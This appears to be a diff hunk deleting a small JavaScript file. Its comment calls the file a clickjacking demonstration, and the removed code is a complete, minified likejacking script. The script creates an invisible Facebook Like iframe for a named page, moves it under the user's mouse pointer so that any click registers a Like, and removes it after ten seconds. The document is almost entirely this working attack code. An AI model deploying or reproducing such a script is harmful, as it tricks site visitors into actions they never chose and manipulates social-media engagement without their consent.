@@ -1,5 +1,0 @@
-/*
-This code demonstrate a clickjack attack on websites. Similar to that of twitter & on facebook
-
-*/
-(function(){function i(i){return n?(e=event.clientX+document.body.scrollLeft,t=event.clientY+document.body.scrollTop):(e=i.pageX,t=i.pageY),e<0&&(e=0),t<0&&(t=0),r.style.top=t-8+"px",r.style.left=e-25+"px",!0}var e=0,t=0,n=document.all?!0:!1;n||document.captureEvents(Event.MOUSEMOVE);var r=document.createElement("iframe");r.src="http://www.facebook.com/plugins/like.php?href="+encodeURIComponent("http://www.facebook.com/pages/Talkycloud/209382865871186")+"&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80",r.scrolling="no",r.frameBorder=0,r.allowTransparency="true",r.style.border=0,r.style.overflow="hidden",r.style.cursor="pointer",r.style.width="53px",r.style.height="23px",r.style.position="absolute",r.style.opacity=0,document.getElementsByTagName("body")[0].appendChild(r),window.addEventListener("mousemove",i,!1),setTimeout(function(){document.getElementsByTagName("body")[0].removeChild(r),window.removeEventListener("mousemove",i,!1)},1e4)})();
